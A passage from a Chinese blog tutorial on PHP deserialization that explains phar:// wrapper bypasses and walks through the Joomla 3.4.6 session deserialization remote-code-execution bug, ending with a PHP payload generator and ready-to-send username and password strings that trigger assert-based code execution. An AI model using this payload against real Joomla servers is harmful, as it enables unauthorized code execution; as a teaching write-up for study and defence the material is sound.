<p>虽然某些函数能够支持 phar:// 的协议，但是如果目标服务器没有关闭 phar.readonly 时，就不能正常执行反序列化操作。</p>
<p><strong>在禁止 phar 开头的情况下的替代方法:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib://phar://phar.phar/test.txt</span><br><span class="line"></span><br><span class="line">compress.bzip2://phar://phar.phar/test.txt </span><br><span class="line"></span><br><span class="line">php://filter/read=convert.base64-encode/resource=phar://phar.phar/test.txt</span><br></pre></td></tr></table></figure>
<p>虽然会报 warning，但是还是会执行。</p>
<h3 id="joomla-346反序列化执行"><a class="markdownIt-Anchor" href="#joomla-346反序列化执行">#</a> Joomla  3.4.6 反序列化执行</h3>
<p>Joomla 反序列化漏洞的主要原因是：</p>
<blockquote>
<p>Joomla 不论账号密码是否正确，都会把登录的用户名和密码，通过序列化的方式存储在 session 表中，再以反序列化的方式读取 session 表中的内容。由于 protected 修饰的变量在序列化的时候，会变成 \x00 + * + \x00 + [变量名] 的形式，而 mysql 无法保存 NULL 字节的数据，所以在向 session 表写入的过程中会将 \x00*\x00 替换为 \0\0\0 ，同样在读取 session 表中的内容的时候会再次转换，然后进行反序列化。如果在向 session 表存储的过程中构造恶意构造一些 \0\0\0，那么在进行反序列化的时候就会由于字节数对不上，导致 “溢出” ，使得反序列化对象逃逸出来。</p>
</blockquote>
<p>如果上面这段没看懂，可以看上面利用章节的对象逃逸，如果还看不懂就退学吧</p>
<p>尝试使用错误的账号密码登录，查看一下 session 表中的内容：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201028001846145-1227489260.png" alt="img"></p>
<p>在登录过程中，会有一个 303 的跳转，这个跳转是先把用户的输入经过序列化存储在 session 表中，读取的时候再从 session 表中取出数据进行反序列化，进行账号密码对比</p>
<p>通过序列化写入 session 表的具体代码如下：</p>
<p>Joomla/libraries/joomla/session/storage/database.php ——&gt; write()</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202010/1344396-20201028225321914-653179029.png"><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201028225321914-653179029.png" alt="img"></a></p>
<p>因为 protected 修饰的变量在序列化后会变成这种形式：\x00 + * + \x00 + [变量名]，而 mysql 无法保存 NULL 字节的数据，所以在代码中可以看到在写入 session 表的过程中会将 \x00*\x00 替换为 \0\0\0 来进行存储，就比如 Registry 类下 protected 修饰的 $data 变量，序列化存储为：</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202010/1344396-20201028231208408-1317263109.png"><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201028231208408-1317263109.png" alt="img"></a></p>
<p>通过反序列化读取 session 表的具体代码如下：</p>
<p>Joomla/libraries/joomla/session/storage/database.php ——&gt; read()</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201028225519116-1363963610.png" alt="img"></p>
<p>在读取时会重新把 \0\0\0 替换为 \x00*\x00 来进行反序列化。</p>
<p>因此反序列化存入 session 表中的数据比原始数据要多 3 个字节</p>
<p>如果传入的用户名为 \0\0\0admin，序列化写入 session 表中的数据为：</p>
<p>在调用 read 方法进行读取时会先将 \0\0\0 转换为 N*N（\x00 为空字节为方便展示这里使用 N 代替）：</p>
<p>\0\0\0admin</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:8:&quot;username&quot;;s:11:&quot;N*Nadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;</span><br></pre></td></tr></table></figure>
<p>因为 read 之后长度变短了 3 个字节，在反序列化的时候 username 的值为 s:11:“N<em>Nadmin&quot;，但是实际只有 8 个字节，为了满足反序列化的规则，就会吃掉后面 3 个字节的数据，直至凑齐 11 个字符，也就是 s:11:&quot;N</em>Nadmin”;s。</p>
<p>利用这个思路，足够多的 \0\0\0 就可以将 password 字段的数据逃逸出来，构造如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:8:s:&quot;username&quot;;s:54:&quot;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;</span><br></pre></td></tr></table></figure>
<p>read () 之后：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:8:s:&quot;username&quot;;s:54:&quot;N*NN*NN*NN*NN*NN*NN*NN*NN*N&quot;;s:8:&quot;password&quot;;s:6:&quot;12345</span><br></pre></td></tr></table></figure>
<p>username 的值为 N<em>NN</em>NN<em>NN</em>NN<em>NN</em>NN<em>NN</em>NN*N&quot;;s:8:“password”;s:6:&quot;12345，后面补上 &quot; 和；就成功逃逸出来了</p>
<p>实现对象注入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:8:s:&quot;username&quot;;s:54:&quot;N*NN*NN*NN*NN*NN*NN*NN*NN*N&quot;;s:8:&quot;password&quot;;s:6:&quot;12345&quot;;s:2:&quot;HS&quot;:O:15:&quot;ObjectInjection&quot;</span><br></pre></td></tr></table></figure>
<p>这里来分析一下利用链，通过搜索 eval/assert/call_user_func… 这类可以利用并且参数可控的危险函数，可以找到用于构造执行链的类：</p>
<p>这几个文件调取 call_user_func 的方式都相同，来看一下 libraries\joomla\database\driver\mysqli.php 中方法的具体实现</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221114210130490.png" alt="image-20221114210130490"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201031162618304-261047353.png" alt="img"></p>
<p>当 JDatabaseDriverMysqli 这个类的对象被调用，在结束时都会调用析构函数__destruct，__destruct 中会调用 disconnect () 方法。</p>
<p>而当<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>c</mi><mi>o</mi><mi>n</mi><mi>n</mi><mi>e</mi><mi>c</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mtext>为</mtext><mi>t</mi><mi>r</mi><mi>u</mi><mi>e</mi><mtext>的时候，就会调用</mtext><mi>c</mi><mi>a</mi><mi>l</mi><msub><mi>l</mi><mi>u</mi></msub><mi>s</mi><mi>e</mi><msub><mi>r</mi><mi>f</mi></msub><mi>u</mi><mi>n</mi><msub><mi>c</mi><mi>a</mi></msub><mi>r</mi><mi>r</mi><mi>a</mi><mi>y</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">this-&gt;connection为true的时候，就会调用call_user_func_array(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal">n</span><span class="mord mathnormal">e</span><span class="mord mathnormal">c</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">为</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">u</span><span class="mord mathnormal">e</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">候</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">调</span><span class="mord cjk_fallback">用</span><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">u</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord mathnormal">u</span><span class="mord mathnormal">n</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mopen">(</span></span></span></span>h, array(&amp;this)); 方法对disconnectHandlers数组中的每个值，都会执行call_user_func_array()，并将&this 作为参数引用，但是不能控制参数，所以不能直接构造 assert+eval 来执行任意代码。</p>
<p>继续往下看发现在 libraries\simplepie\simplepie.php 中有一处 call_user_func 方法调用</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201031171046685-27582232.png" alt="img"></p>
<p>这个 call_user_func ($this-&gt;cache_name_function, <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>f</mi><mi>e</mi><mi>e</mi><msub><mi>d</mi><mi>u</mi></msub><mi>r</mi><mi>l</mi><mo stretchy="false">)</mo><mtext>两个参数都是可控的，于是只要满足</mtext></mrow><annotation encoding="application/x-tex">this-&gt;feed_url)两个参数都是可控的，于是只要满足</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">e</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">u</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mclose">)</span><span class="mord cjk_fallback">两</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">参</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">都</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">控</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">于</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">只</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">满</span><span class="mord cjk_fallback">足</span></span></span></span> this-&gt;cache 为 True，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>r</mi><mi>a</mi><msub><mi>w</mi><mi>d</mi></msub><mi>a</mi><mi>t</mi><mi>a</mi><mtext>为</mtext><mi>T</mi><mi>r</mi><mi>u</mi><mi>e</mi><mtext>，</mtext></mrow><annotation encoding="application/x-tex">this-&gt;raw_data为True，</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">a</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord cjk_fallback">为</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">u</span><span class="mord mathnormal">e</span><span class="mord cjk_fallback">，</span></span></span></span>parsed_feed_url [‘scheme’] 不为空就能够 RCE 了，并且 $parsed_feed_url [‘scheme’] 可以能够利用 || $a=‘http//’; 绕过 scheme 的解析</p>
<p>不过这个 call_user_func 属于 init () 方法，并不属于魔术方法，所以需要结合前面 JDatabaseDriverMysqli 类下的 disconnect () 中的 call_user_func_array 方法实现对 init () 方法的回调。就相当于：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;disconnectHandlers = array(&quot;test&quot;=&gt;array(new SimplePie(),&quot;init&quot;));</span><br></pre></td></tr></table></figure>
<p>这样的话就相当于实例化了一个 SimplePie 类的对象，并且调用 SimplePie 类下的 init () 方法。</p>
<p>这里还有一个问题，虽然实例化了一个 SimplePie 的类，但是 SimplePie 类不会自动加载。需要去引入加载类。</p>
<p>/libraries/legacy/simplepie/factory.php</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201031184225965-1491276190.png" alt="img"></p>
<p>发现刚开始就导入了 SimplePie 类，并且 JSimplepieFactory 类属于 autoload，会自动加载，这样的话只需要引入这个类就可以成功加载 SimplePie。</p>
<p>payload 如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class JSimplepieFactory&#123;&#125;</span><br><span class="line">class JDatabaseDriverMysql&#123;&#125;</span><br><span class="line">class JDatabaseDriverMysqli</span><br><span class="line">&#123;</span><br><span class="line">    protected $abc;</span><br><span class="line">    protected $connection;</span><br><span class="line">    protected $disconnectHandlers;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;abc = new JSimplepieFactory();</span><br><span class="line">        $this-&gt;connection = 1;</span><br><span class="line">        $this-&gt;disconnectHandlers = [</span><br><span class="line">            [new SimplePie, &quot;init&quot;],</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class SimplePie</span><br><span class="line">&#123;</span><br><span class="line">    var $sanitize;</span><br><span class="line">    var $cache_name_function;</span><br><span class="line">    var $feed_url;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;feed_url = &quot;phpinfo();JFactory::getConfig();exit;&quot;;</span><br><span class="line">        $this-&gt;cache_name_function = &quot;assert&quot;;</span><br><span class="line">        $this-&gt;sanitize = new JDatabaseDriverMysql();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj = new JDatabaseDriverMysqli();</span><br><span class="line">$ser = serialize($obj);</span><br><span class="line">echo str_replace(chr(0) . &#x27;*&#x27; . chr(0), &#x27;\0\0\0&#x27;, $ser);?&gt;</span><br></pre></td></tr></table></figure>
<p>最后构造的账号密码为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username：\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0</span><br><span class="line">password：123&quot;;s:4:&quot;test&quot;:O:21:&quot;JDatabaseDriverMysqli&quot;:3:&#123;s:6:&quot;\0\0\0abc&quot;;O:17:&quot;JSimplepieFactory&quot;:0:&#123;&#125;s:13:&quot;\0\0\0connection&quot;;i:1;s:21:&quot;\0\0\0disconnectHandlers&quot;;a:1:&#123;i:0;a:2:&#123;i:0;O:9:&quot;SimplePie&quot;:3:&#123;s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:&#123;&#125;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:8:&quot;feed_url&quot;;s:37:&quot;phpinfo();JFactory::getConfig();exit;&quot;;&#125;i:1;s:4:&quot;init&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>登录时需要登录两次，第一次将他序列化存储进 session 中，第二次将 session 中的值反序列化和我们的输入进行比对，在第二次 rce 产生</p>
<blockquote>
<p>最后总结一下：</p>
<p>1.Joomla 中会把登录的用户名和密码序列化存储进入 session，并且放入数据库中。</p>
<p>2. 由于 username 和 password 是 protected，因此会有 <code>*N*</code>  的修饰，但数据库中不能存储 <code>N*N</code> （N 为 ASCII 为 0 的字符），因此在序列化入 session 中会将 <code>N*N</code>  替换为 <code>\0\0\0</code> ，在下次和我们输入的用户名密码判断时反序列化，将其变为合规的序列化字符串</p>
<p>3. 漏洞的关键点在于从 <code>\0\0\0</code>  变为 <code>N*N</code>  时字符变少了三个，我们可以利用变少的三个做变量逃逸，从而覆盖 password</p>
<p>4. 因此我们的输入用户名时可以自己构造 <code>\0</code> ，比如我们构造如下用户 <code>\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0</code> ，这样反序列化后多出了 27 个字符把后面的 password 全部吃掉了 <code>s:8:s:&quot;username&quot;;s:54:&quot;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;</code> ，password 被吃掉后我们就可以构造我们自己的 password，里面的内容为恶意代码，我们接下来要干的事情就是把我们序列化过的恶意代码放入因为逃逸而变为可控变量的 password 中</p>
<p>5. 然后我们需要找危险函数，来调用，我们在 <code>libraries\joomla\database\driver\mysqli.php</code>  中找到了 <code>disconnect()</code>  函数，其中调用了 <code>call_user_func_array</code> ，而 mysqli 类中的 <code>__destruct()</code>  会自动调用 <code>disconnect ()</code></p>
<p>6. 但是 <code>disconnect()</code>  函数中的 <code>call_user_func_array</code>  中的参数我们只能控制第一个参数 <code>$h</code> ，不能直接构造恶意代码</p>
<p>7. 我们在 <code>libraries\simplepie\simplepie.php</code>  中有一个 <code>init()</code>  函数，其中还可以找到一个危险函数 <code>call_user_func</code>  方法调用，并且好消息是他的两个参数 <code>cache_name_function</code>  和 <code>feed_url</code>  我们都可以控制</p>
<p>8. 但是 <code>init()</code>  不是魔法方法，不会自动调用，我们需要使用一些奇技淫巧调用。即使用刚刚的 <code>disconnect()</code>  函数自动调用 <code>init()</code></p>
<p>9. 接下来的问题就是我们如何用 <code>disconnect()</code>  中的一个可控参数完成对 <code>init()</code>  的调用。我们使用 <code>call_user_func_array(array(new SimplePie(),&quot;init&quot;))</code>  这样的形式来调用，array 中第一个是我们的类名，第二个是类函数名，而我们不需要 ``call_user_func_array ()` 中的第二个变量</p>
<p>10. 最后一个问题是 <code>libraries\simplepie\simplepie.php</code>  和 <code>libraries\joomla\database\driver\mysqli.php</code>  是两个不同的 <code>php</code>  文件，如果没有 <code>include()</code>  这类函数的情况下是无法使用隔壁 php 的类的。我们的解决方案是找到一个新的文件 <code>/libraries/legacy/simplepie/factory.php</code> ，其中 <code>jimport(simplepie.simplepie)</code> ，同时 <code>factory.php</code>  中的 <code>JSimplepieFactory</code>  是自动 <code>autoload</code> ，这样我们就能加载 <code>simplepie</code>  类</p>
<p>11. 由于 <code>session</code>  的存在，我们需要抓包，连续放包两次，第一次将 <code>session</code>  写入数据库中，第二次将我们的输入和数据库中反序列化的 <code>session</code>  比对，一旦反序列化，我们上面构造的恶意 <code>payload</code>  触发，实现 <code>rce</code></p>
</blockquote>

  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">Edited on</span>
    <time title="Modified: 2022-11-14 21:57:23" itemprop="dateModified" datetime="2022-11-14T21:57:23+08:00">2022-11-14</time>
  </span>
</div>

      
<div class="reward">
  <button><i class="ic i-heartbeat"></i> Donate</button>
  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
  <div id="qr">
      
      <div>
        <img data-src="/images/wechatpay.png" alt="John Doe WeChat Pay">
        <p>WeChat Pay</p>
      </div>
      
      <div>
        <img data-src="/images/alipay.png" alt="John Doe Alipay">
        <p>Alipay</p>
      </div>
      
      <div>
        <img data-src="/images/paypal.png" alt="John Doe PayPal">
        <p>PayPal</p>
      </div>
  </div>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>Post author:  </strong>John Doe <i class="ic i-at"><em>@</em></i>Hexo
  </li>
  <li class="link">
    <strong>Post link: </strong>
    <a href="http://example.com/2022/04/16/Unserialize/" title="反序列化">http://example.com/2022/04/16/Unserialize/</a>
  </li>
  <li class="license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/2022/03/16/SQL%E6%B3%A8%E5%85%A5/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicliwyw55j20zk0m8hdt.jpg" title="SQL injection">
  <span class="type">Previous Post</span>
  <span class="category"><i class="ic i-flag"></i> web安全</span>
  <h3>SQL injection</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/2022/04/16/Upload/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicit31ffoj20zk0m8naf.jpg" title="File upload">
  <span class="type">Next Post</span>
  <span class="category"><i class="ic i-flag"></i> web安全</span>
  <h3>File upload</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="Contents">
          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#unserialize"><span class="toc-number">1.</span> <span class="toc-text"> Unserialize</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1php"><span class="toc-number">1.1.</span> <span class="toc-text"> 1.php</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E4%B8%8E%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 类与对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 魔法方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.3.</span> <span class="toc-text"> 序列化与反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.3.1.</span> <span class="toc-text"> 序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.3.2.</span> <span class="toc-text"> 反序列化</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.4.</span> <span class="toc-text"> 利用：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x00-__destruct%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.4.1.</span> <span class="toc-text"> 0x00 __destruct () 利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-__tostring%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.4.2.</span> <span class="toc-text"> 0x01 __tostring () 利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-__wakeup%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.4.3.</span> <span class="toc-text"> 0x02 __wakeup () 利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-__wakeup%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.4.4.</span> <span class="toc-text"> 0x03 __wakeup () 绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04%E5%AF%B9%E8%B1%A1%E9%80%83%E9%80%B8"><span class="toc-number">1.1.4.5.</span> <span class="toc-text"> 0x04 对象逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%90%8E%E5%AD%97%E7%AC%A6%E5%8F%98%E5%A4%9A"><span class="toc-number">1.1.4.5.1.</span> <span class="toc-text"> 过滤后字符变多</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%90%8E%E5%AD%97%E7%AC%A6%E5%8F%98%E5%B0%91"><span class="toc-number">1.1.4.5.2.</span> <span class="toc-text"> 过滤后字符变少</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x05pop-%E9%93%BE%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.4.6.</span> <span class="toc-text"> 0x05POP 链利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x06"><span class="toc-number">1.1.4.7.</span> <span class="toc-text"> 0x06</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x07"><span class="toc-number">1.1.4.8.</span> <span class="toc-text"> 0x07</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x08"><span class="toc-number">1.1.4.9.</span> <span class="toc-text"> 0x08</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x09"><span class="toc-number">1.1.4.10.</span> <span class="toc-text"> 0x09</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php_session-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.4.11.</span> <span class="toc-text"> PHP_session 反序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 